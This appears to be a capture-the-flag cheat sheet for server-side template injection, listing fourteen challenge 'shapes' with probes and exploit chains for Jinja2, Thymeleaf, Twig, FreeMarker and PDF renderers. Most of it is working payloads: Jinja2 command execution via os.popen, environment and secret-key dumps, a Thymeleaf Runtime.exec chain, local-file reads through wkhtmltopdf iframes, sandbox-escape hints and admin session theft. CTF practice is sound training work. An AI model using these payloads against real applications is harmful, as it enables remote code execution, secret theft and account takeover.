# CTF challenge shapes — the playbook by presentation

The way the challenge PRESENTS tells you which engine+chain to
expect before the first probe.

---

## Shape 1: "Name greeter" — `?name=x` echoes "Hello x"

```text
Signals: one param, echoed in greeting, flask-looking
Probe:   ?name={{7*7}} → "Hello 49" → Jinja2
Chain:   {{config}} → {{lipsum.__globals__.os.environ}}
Flag:    usually env-var or config-key
Budget:  5 probes
```

## Shape 2: "Custom 404" — `/{anything}` → "page {anything} not found"

```text
Signals: path-segment echoed in error body
Probe:   /{{7*7}} → "page 49 not found" → engine in error-template
         /%7B%7B7*7%7D%7D → url-encoded variant
Chain:   engine-detect → flask → {{config}} / spring → __${}__
Trick:   path-vs-query — the param sits in PATH not query —
         url-encode the delimiters
```

## Shape 3: "Template preview" — POST a template, get render

```text
Signals: /render /preview /template endpoint takes raw source
Probe:   POST body={{7*7}} → 49 → direct eval — no concat needed
Chain:   full engine — write the template that reads the flag
         {{lipsum.__globals__.os.popen('cat /flag').read()}}
```

## Shape 4: "Email signup" → welcome-mail renders your name

```text
Signals: "check your email" — name in the mail
Probe:   name={{7*7}}X → the EMAIL shows 49X
Read:    /webmail /mail /inbox /mailhog:8025 — find the mail
Chain:   mailer-context — {{user}} {{company}} {{config}} differ
         — try {{config.SECRET_KEY}} then forge
```

## Shape 5: "Invoice/Report PDF" — download a generated doc

```text
Signals: /invoice /report /export → PDF response
Probe:   order-note={{7*7}} → pdf_text the response → "49"?
Chain-2: <iframe src=file:///flag> — wkhtmlto renders local files
         → the PDF embeds /flag — pdf_text reads it
         — no engine-eval needed if wkhtmlto is the renderer
```

## Shape 6: "Admin dashboard renders your field"

```text
Signals: stored field (bio/motto/note) shows in admin view
Probe:   bio={{7*7}} → view AS ADMIN? — or the public profile?
         — the render-context differs by VIEWER
Chain:   admin-context → {{app.config}} {{_context}} — richer
         objects — or steal the admin session via the render
```

## Shape 7: "Error message echoes input" — `?x=` → "Error: x"

```text
Signals: input inside error text
Probe:   ?x={{7*7}} → "Error: 49" → error-template engine
Chain:   engine detect → exploit; AND the error path may skip
         sanitizers applied on the happy-path
```

## Shape 8: "Sandboxed template" — the challenge says so

```text
Signals: "secure template" "sandboxed" in description
Probe:   {{7*7}} first — confirm eval still reachable
Chain:   the escape IS the challenge —
         jinja-sandbox → lipsum/cycler/namespace + subclasses
         twig-sandbox → _self.env / map-filter callables
         freemarker → ?api / bundled Execute when resolver=SAFER
```

## Shape 9: "Log viewer" — your input lands in a log then renders

```text
Signals: /log /audit — a render of past entries — your ua/agent
Probe:   User-Agent: {{7*7}} → the log-VIEW evaluates? —
         render-of-stored-ua — second-order — fire and reload
Chain:   the log-render context — same engine, different binds
```

## Shape 10: "Search" — `?q=` → "N results for q"

```text
Signals: q echoed in the results-header
Probe:   ?q={{7*7}} → "0 results for 49" → eval before the query
Chain:   standard flask chain
Trick:   the query-param may be re-encoded — test {{7*7}} raw
         AND url-encoded AND {{7* 7}} spaced
```

## Shape 11: "Multi-lang" — `?lang=en` picks a template

```text
Signals: lang/locale param selects template-file or view-name
Probe:   lang={{7*7}} → evaluates? → Spring-Thymeleaf shape
         lang=../flag → file-inclusion shape
         lang=__${7*7}__::x → preprocessing eval
Chain:   __${T(java.lang.Runtime).getRuntime().exec('id')}__::x
```

## Shape 12: "Web framework recon" — the stack names the engine

| Stack observed | Engine to expect |
|---|---|
| Flask/django header, `werkzeug`, python stack | Jinja2 |
| Spring, `X-Application-Context`, java | Thymeleaf/FreeMarker |
| `X-Powered-By: Express`, node | EJS/Nunjucks/Pug/Handlebars |
| `X-Powered-By: PHP`, laravel | Blade/Twig |
| Rails, `X-Runtime` | ERB/Slim/Haml |
| `Server: Apache-Coyote` | JSP/Velocity |
| Jekyll/GitHub-pages | Liquid |
| Tornado | Tornado-templates |
| Phalcon | Volt |
| Symfony | Twig |

`Server:`/`X-Powered-By:`/`Set-Cookie:` (laravel_session,
connect.sid, rack.session, JSESSIONID) names the stack — the
stack names the engine.

## Shape 13: "The debug-error shape" — force the stack

```text
/?x={{      → unclosed → engine's parse-error page
/?x=1/0     → zero-div → stack-trace page
/api/x      → 404-handler may template the path
```

Debug pages leak: engine + version + file-paths + bound locals —
the WHOLE exploitation plan in one 500.

## Shape 14: "Two-input confusion" — one safe, one not

```text
name= safe-field (sanitized)
bio = the field they forgot
→ probe EVERY string-field — the sanitized-looking endpoint
  often has one field that reaches the template raw
```

## The one-page check — every challenge

```text
1. find every input → param, header, cookie, body-field, path-seg
2. fire {{7*7}} at each → which one renders "49"?
3. that's your render-point → fingerprint → exploit
4. if ALL render literal → stored? email? pdf? async? — look for
   the deferred render — OR format-injection — try {0} / {x.y}
```
